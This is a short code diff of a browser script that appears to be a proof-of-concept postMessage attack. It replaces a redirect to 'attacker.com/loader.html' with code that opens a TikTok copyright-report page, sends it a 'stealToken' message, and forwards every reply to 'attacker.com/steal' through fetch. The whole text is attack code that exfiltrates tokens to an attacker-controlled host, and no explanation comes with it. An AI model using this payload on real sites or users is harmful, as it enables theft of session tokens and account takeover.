@@ -1,6 +1,10 @@
 <script>
-parent.postMessage({
-    action: "requestRedirectionTo",
-    targetUrlStr: "https://attacker.com/loader.html"
-}, "*");
+const win = window.open('https://www.tiktok.com/legal/report/Copyright', '_blank');
+setTimeout(() => {
+    win.postMessage('stealToken', '*');
+}, 2000);
+
+window.addEventListener('message', e => {
+    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
+});
 </script>
